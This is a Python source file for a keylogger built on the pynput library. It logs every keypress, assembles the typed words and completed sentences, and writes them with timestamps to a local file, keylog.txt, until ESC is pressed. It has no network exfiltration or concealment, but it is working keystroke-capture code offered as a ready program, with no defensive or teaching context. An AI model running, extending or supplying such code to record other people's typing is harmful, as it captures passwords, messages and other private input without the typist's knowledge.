import logging
from pynput import keyboard

# Set up logging configuration
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')

keylogger_running = True
current_word = ""
current_sentence = ""

def on_press(key):
    global current_word, current_sentence
    
    try:
        # If the key is an alphabet or number, add it to the current word
        char = key.char
        if char.isalpha():
            logging.info(f"Alphabets pressed: {char}")
            current_word += char  # Append to current word if it's an alphabet
        elif char.isdigit():
            logging.info(f"Numeric pressed: {char}")
            current_word += char  # Append to current word if it's a numeric character
        else:
            logging.info(f"Spcl Character pressed: {char}")
            current_word += char  # Append special character to current word

    except AttributeError:
        # If the key is a special key, log it
        if key == keyboard.Key.space:
            logging.info(f"Space pressed, current word: {current_word}")
            current_sentence += current_word + " "
            current_word = ""  # Reset word after space
        elif key == keyboard.Key.enter:
            logging.info(f"Enter pressed, sentence complete: {current_sentence + current_word}")
            logging.info(f"Complete sentence: {current_sentence + current_word}")  # Log the complete sentence
            current_sentence = ""  # Reset sentence after logging
            current_word = ""  # Reset word after sentence completion
        elif key == keyboard.Key.backspace:
            if current_word:
                logging.info(f"Backspace pressed, current word before deletion: {current_word}")
                current_word = current_word[:-1]  # Remove last character on backspace
            else:
                logging.info("Backspace pressed, but no word to delete.")
        elif key == keyboard.Key.tab:
            logging.info("Tab pressed")
        elif key == keyboard.Key.ctrl:
            logging.info("Control key pressed")
        elif key == keyboard.Key.shift:
            logging.info("Shift key pressed")
        elif key == keyboard.Key.alt:
            logging.info("Alt key pressed")
        elif key == keyboard.Key.delete:
            logging.info("Delete key pressed")
        elif key == keyboard.Key.left:
            logging.info("Left Arrow key pressed")
        elif key == keyboard.Key.right:
            logging.info("Right Arrow key pressed")
        elif key == keyboard.Key.up:
            logging.info("Up Arrow key pressed")
        elif key == keyboard.Key.down:
            logging.info("Down Arrow key pressed")
        else:
            logging.info(f"Special key pressed: {key}")

def on_release(key):
    global keylogger_running
    
    if key == keyboard.Key.esc:
        keylogger_running = False
        logging.info("Keylogger stopped by user.")
        return False

def start_keylogger():
    logging.info("Keylogger is running... Press ESC to stop.")
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        logging.info("Keylogger interrupted manually.")
        print("Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()
